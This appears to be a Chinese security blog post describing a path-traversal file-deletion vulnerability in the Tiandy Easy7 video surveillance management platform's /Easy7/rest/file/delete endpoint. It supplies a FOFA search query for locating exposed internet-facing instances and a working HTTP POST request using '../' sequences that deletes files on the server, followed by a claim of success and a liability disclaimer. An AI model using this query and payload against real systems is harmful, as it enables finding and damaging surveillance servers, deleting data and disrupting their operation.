#  天地伟业Easy7 /Easy7/rest/file/delete 文件删除漏洞  
 0day收割机   2026-04-25 08:31  
  
# 漏洞简介  
  
天地伟业Easy7是一款用于视频监控管理的软件  
系统。  
  
该系统的/Easy7/rest/file/delete接口在处理文件删除请求时，直接将用户传入的参数与预设路径拼接，且未对路径回溯符（../）进行任何过滤或校验。这使得攻击者可以跳出预设的存储目录，删除服务器上任意位置的、且应用进程有权操作的文件，可能导致系统崩溃或业务中断。  
# fofa语法  
> body="/Easy7/apps/WebService/LogIn.jsp" || body="Easy7/VideoLib.EXE" || body="/Easy7/index.html" || (body="<img src=\"./images/ico/Easy7_logo_transparent.png") && title="平台"  
  
# 漏洞复现  
> 删除之前上传的一个文本为例  
  
```
POST /Easy7/rest/file/delete HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

fileName=/../../srsPath/1.txt
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWDFpNAicxbMUlZBZLyhibSSeUIgRRITHWWkt6S0hVBmB7ok8RlNicv2p2KAUnWibTspFQFnMictP85SIHPgOMctLcdImuz3aict9icz78/640?wx_fmt=png&from=appmsg "")  
  
成功删除  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
